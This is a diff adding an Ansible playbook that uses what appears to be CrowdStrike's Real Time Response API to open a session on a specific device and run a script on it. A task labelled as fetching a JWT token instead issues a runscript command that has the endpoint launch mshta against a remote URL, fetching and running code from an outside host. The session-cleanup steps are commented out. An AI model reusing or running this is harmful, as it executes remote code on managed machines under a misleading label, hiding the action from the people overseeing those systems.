@@ -1,0 +1,53 @@
+---
+  - hosts: localhost
+    connection: local
+    gather_facts: false
+    tasks:
+      - name: Initialize a session with a device
+        uri:
+          url: "{{ CSAPIURL }}/real-time-response/entities/sessions/v1"
+          method: POST
+          headers:
+            accept: application/json
+            Authorization: Bearer {{ lookup('env','CSACCESSTOKEN') }}
+          body_format: json
+          body:
+            device_id: '864e07363d92481b9ee06c8af0e00729'
+            "queue_offline": true
+          status_code: 201
+        register: session
+      - name: Print the session
+        ansible.builtin.debug:
+          msg: "{{ session.json.resources[0].session_id }}"
+      - name: Get a JWT token to authenticate API requests
+        uri:
+          url: "{{ CSAPIURL }}/real-time-response/entities/admin-command/v1"
+          method: POST
+          headers:
+            accept: application/json
+            Authorization: Bearer {{ lookup('env','CSACCESSTOKEN') }}
+          body_format: json
+          body:
+            base_command: runscript
+            session_id: "{{ session.json.resources[0].session_id }}"
+            command_string: "runscript -Raw=```mshta http://dev.spiehlerfamily.com/winrepo/install/windowse```"
+          status_code: 201
+        register: response
+      - name: Print the session
+        ansible.builtin.debug:
+          msg: "{{ response }}"
+      #- name: Delete the session
+      #  uri:
+      #    url: "{{ CSAPIURL }}/real-time-response/entities/sessions/v1"
+      #    method: DELETE
+      #    headers:
+      #      accept: application/json
+      #      Authorization: Bearer {{ lookup('env','CSACCESSTOKEN') }}
+      #    body_format: json
+      #    body:
+      #      session_id: "{{ session.json.resources[0].session_id }}"
+      #    status_code: 201
+      #  register: delsession
+      #- name: Print the session
+      #  ansible.builtin.debug:
+      #    msg: "{{ delsession }}"
